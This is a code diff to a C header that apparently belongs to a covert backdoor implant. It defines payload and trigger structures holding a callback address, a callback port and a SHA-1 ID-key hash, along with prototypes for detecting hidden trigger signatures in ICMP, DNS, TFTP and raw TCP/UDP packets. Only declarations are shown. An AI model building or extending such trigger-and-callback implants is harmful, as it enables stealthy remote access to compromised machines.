@@ -5,24 +5,47 @@
 
 #define TFTP_WRQ_OPCODE 2
 
-#ifdef WIN32
-#include <pshpack1.h>
-#include "stdint.h"
-#endif
 
-typedef struct {
-  uint8_t seed;
-  uint8_t package[9];
-  uint16_t crc;
-} payload;
-  
-// Constants for building and encoding the raw TCP and UDP triggers
+
+// Constants for raw TCP and UDP triggers
 #define	MIN_PACKET_SIZE		126
 #define	MAX_PACKET_SIZE		472
 #define START_PAD		8
 #define CRC_DATA_LENGTH		84
-#define PAD1_LENGTH		8
-#define PAD2_LENGTH		8
+#define RANDOM_PAD1		200
+#define RANDOM_PAD2		146
+#define PAD1			8
+#define PAD2			8
+
+#define ID_KEY_HASH_SIZE	20	// Size of SHA-1 hash
+#define ID_KEY_LENGTH_MIN	8	// Minimum character length for a trigger key
+
+/*! \struct Payload
+ *
+ * 	\brief	Payload data structure
+ *
+ * 	\param in_addr_t callback_addr	- Call-back IP address
+ * 	\param uint16_t callback_port	- Call-back port
+ * 	\param uint8_t trigger_key	- Trigger key (SHA-1)
+ * 	\param uint16_t crc		- CRC of payload
+ */
+typedef struct __attribute__((packed))
+{
+	uint8_t		seed;				// Obfuscation seed used for triggers other than raw TCP/UDP.
+	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
+	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
+	uint8_t		idKey_hash[ID_KEY_HASH_SIZE];	// ID Key hash
+	uint16_t	crc;				// CRC of this payload
+} Payload;
+
+typedef struct __attribute__((packed))
+{
+	int		delay;				// Trigger delay
+	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
+	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
+	uint16_t	trigger_port;			// for raw triggers, the TCP or UDP port
+	unsigned char	idKey_hash[ID_KEY_HASH_SIZE];	// SHA-1 of ID key
+} TriggerInfo;
 
 // begin macros for RAW pkt processing
 #define IDO_MAXPACKET (64 * 1024)
@@ -194,33 +217,39 @@ typedef struct __ido_ip_packet_t 	packet_ip_t;
 
 // BEGIN FUNC DECLS
 int 
-dt_signature_check( unsigned char*  pkt, int len, payload* p);
+dt_signature_check( unsigned char*  pkt, int len, Payload* p);
 
 int
-dt_ping_request_received( struct icmphdr_t * icmp, payload* p ) ;
+dt_ping_request_received( struct icmphdr_t * icmp, Payload* p ) ;
 
 int
-dt_ping_reply_received( struct icmphdr_t * icmp, payload* p );
+dt_ping_reply_received( struct icmphdr_t * icmp, Payload* p );
 int 
-dt_error_received( struct icmphdr_t * icmp, payload* p);
+dt_error_received( struct icmphdr_t * icmp, Payload* p);
 
 int
-dt_tftp_received( struct udphdr_t * udp, payload* p);
+dt_tftp_received( struct udphdr_t * udp, Payload* p);
 
 int
-deobfuscate_payload( payload * p);
+deobfuscate_payload( Payload * p);
 
 int
-dt_dns_received( struct udphdr_t * udp, payload* p);
+dt_dns_received( struct udphdr_t * udp, Payload* p);
 
 int
-dt_raw_udp( struct udphdr_t * udp, uint16_t pktlen, payload* p);
+dt_raw_udp( struct udphdr_t * udp, uint16_t pktlen, Payload* p);
 
 int
-dt_raw_tcp( struct tcphdr_t * tcp, uint16_t pktlen, payload* p);
+dt_raw_tcp( struct tcphdr_t * tcp, uint16_t pktlen, Payload* p);
 
 int
-raw_check( void * incload, uint16_t pktlen, payload* p);
+raw_check( void * incload, uint16_t pktlen, Payload* p);
+
+int
+payload_to_trigger_info (Payload *p, TriggerInfo *ti);
+
+void
+displaySha1Hash(char *label, unsigned char *sha1Hash);
 
 #ifdef WIN32
 #include <PopPack.h>
